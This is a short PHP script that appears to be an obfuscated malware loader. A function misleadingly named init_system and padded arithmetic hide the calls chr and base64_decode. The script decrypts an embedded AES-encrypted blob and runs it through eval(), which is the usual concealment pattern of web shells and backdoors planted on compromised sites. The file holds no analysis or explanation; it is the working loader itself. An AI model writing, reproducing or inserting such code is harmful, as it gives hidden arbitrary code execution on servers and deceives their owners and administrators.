<?php
function init_system($c)
{
    $y = array(41 + 3 + 70, 28 * 2 + 48, 99);
    $o = '';
    foreach ($y as $f) {
        $o .= chr($f);
    }
    $o = strrev($o);
    return $o($c);
}

$fic = array(98 + 7 + 1 - (7 + 1) + 14 - 14, 97 - 14 + 14 + 10 + 1 - (10 + 1), 115 * 1 / 1 * 23 / 23 + 1 + 5 - (1 + 5), 101 + 19 - 19 + 1 - 1 - 18 + 18, 54 * 54 / 54 + 5 + 2 - (5 + 2) + 5 + 9 - (5 + 9), 52 + 5 - 5 - 5 + 5 + 1 + 7 - (1 + 7), 95 * 1 / 1 + 10 + 10 - (10 + 10) + 10 - 10, 100 - 15 + 15 + 15 - 15, 101 + 16 - 16 - 2 + 2, 99 + 13 - 13 - 16 + 16 + 5 + 5 - (5 + 5), 111 + 4 + 1 - (4 + 1) + 8 - 8 - 6 + 6 - 17 + 17 - 20 + 20, 100 * 2 / 2 + 9 - 9, 101 - 9 + 9 + 19 - 19);
$ghs = '';
foreach ($fic as $hvt) {
    $ghs .= init_system($hvt);
}
$mrm = 'N6k5L2rbX6yVwmKIkpTwQNwSkz5qayTM3eDdw+R2AIAuFf0I4/iaxtsPFPiVGX1AAHM775pJJavpHWWQfACC4X/U+Vo99ng80kE06LSD9OWLa34kW7mUnD+cFWYAU3io/kP5a8lNG99XqzmkYuqZLHiFfaCWRtPQRACDMyxTrGRDMIHgkxj+yr+NBagPMf35qS9ZzNrHeo5h6ZdFA7247dnnBgNOi44YJEr1d2Z9ab1rJ35b9M0Bpl2QWTzTFE/MeUlQTm/5RFYFPR5lO5QM4pvfNTf9HJUxIakOnlEpvKJFN/Buq1db+x062/2Dt9CbKATAgV8KjS3YqyvPd7YZ8S941J+vtOCt8i0O+7sIDSzn1Do9eHHTOHPNxnlEAS6J7Swz4rL/UQkya3omAdHzqte+Q8YJ9pyO3zlLX9S+Awx3ZfWB/acfDaP+SWhaeq2JmOZ3TXLeTlIy+zH0e3Tm3dpfXe5fAkLgzbE554WY0JFKtVwSdNn/ezVQkHg+ivttKIM9PVB3R0WQ4YWQaelCKukzgp/zrmyUfyYL355O43sDny8ji2MtPvPTUmtaiP5AKQ6wr4dVy2MoPe7mM+MQSDTEgFn1jhY7PkeDXmyLLH6Ca5llEcixjVx214j55emzv9vYz8jtz1ADBiSt6Gcck10X6A81VUwfrxcdZp0KE/2c8DcP91zcmKdy7C6W8df5CZz8ZKHPoKtaN7+1xg4MS2l5mzIqyQG1ZmfdWA7GvWgGpC2NDLZptQDx0ZpfoZfBBjGZbV/qSdz/fKK8siu9dUJf/Lr69EhgADjoIre3hEtNIpQXnjpVDyI5j/gyvuzK8R3Ftd+Y9ky9Dcrr2L272LXqCh44aj1rIMRwW4/IGIT/O4LNu1j+Wfs9V6E9u5rTwAoJoZv3jaExwrSKHhwytOrqSCRI7JO5+5Dk8J1BKZJDMWVCoyP7RM6ZZ0KzQ4Gn0b9TyEnQeIIUugZCOZ2kwtKYueASzrBqnJD+oyWWYf2xqo4QHulujrKEiqUPyo4EPyWCLKCgk7Pef97w0sqysgYJ+KMgXrcZhEVAy3lFbqdLl5G1o3T6sxD4iv7pyAVunqgtEPGKnJTzjfyWYOChug==';
$htc = 'jnJNB7BE7CoLNMp4/XBwigt/7LjCuL+l4J9hgYGd7Bg=';
$muz = '8bLORcbNxwqejXCBqrydvw==';
$lqy = openssl_decrypt($ghs($mrm), 'aes-256-cbc', $ghs($htc), OPENSSL_RAW_DATA, $ghs($muz));
eval($lqy);